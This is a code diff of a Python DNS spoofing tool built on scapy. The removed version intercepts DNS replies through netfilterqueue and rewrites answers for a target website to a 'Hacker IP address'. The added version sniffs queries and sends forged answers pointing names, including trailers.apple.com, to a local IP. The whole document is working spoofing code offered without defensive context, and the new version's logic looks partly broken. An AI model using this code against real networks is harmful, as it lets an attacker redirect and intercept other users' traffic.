@@ -1,37 +1,41 @@
-import netfilterqueue
-import scapy.all as scapy
-import argparse
+from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
+
+IFACE = "enp0s8"   # Or your default interface
+DNS_SERVER_IP = "192.168.1.100"  # Your local IP
+
+BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
 
 
-def get_arguments():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-w", "--website", dest="website",
-                        help="Website url")
-    parser.add_argument("-i", "--ip-address", dest="ip",
-                        help="Hacker IP address")
-    options = parser.parse_args()
-    return options
+def dns_responder(local_ip: str):
 
+    def forward_dns(orig_pkt: IP):
+        print(f"Forwarding: {orig_pkt[DNSQR].qname}")
+        response = sr1(
+            IP(dst='8.8.8.8')/
+                UDP(sport=orig_pkt[UDP].sport)/
+                DNS(rd=1, id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname)),
+            verbose=0,
+        )
+        resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
+        resp_pkt[DNS] = response[DNS]
+        send(resp_pkt, verbose=0)
+        return f"Responding to {orig_pkt[IP].src}"
 
-def spoof_packet(packet):
-    options = get_arguments()
-    dns_packet = scapy.IP(packet.get_payload())
-    if dns_packet.haslayer(scapy.DNSRR):
-        qname = dns_packet[scapy.DNSQR].qname
-        if options.website in qname:
-            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
-            dns_packet[scapy.DNS].an = dns_responce
-            dns_packet[scapy.DNS].ancount = 1
+    def get_response(pkt: IP):
+        if (
+            DNS in pkt and
+            pkt[DNS].opcode == 0 and
+            pkt[DNS].ancount == 0
+        ):
+            if str(pkt["DNS Question Record"].qname):
+                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
+                send(spf_resp, verbose=0, iface=IFACE)
+                return f"Spoofed DNS Response Sent: {pkt[IP].src}"
 
-            del dns_packet[scapy.IP].len
-            del dns_packet[scapy.IP].chksum
-            del dns_packet[scapy.UDP].len
-            del dns_packet[scapy.UDP].chksum
+            else:
+                # make DNS query, capturing the answer and send the answer
+                return forward_dns(pkt)
 
-            packet.set_payload(str(dns_packet))
-    packet.accept()
+    return get_response
 
-
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, spoof_packet)
-queue.run()
+sniff(filter=BPF_FILTER, prn=dns_responder(DNS_SERVER_IP), iface=IFACE)
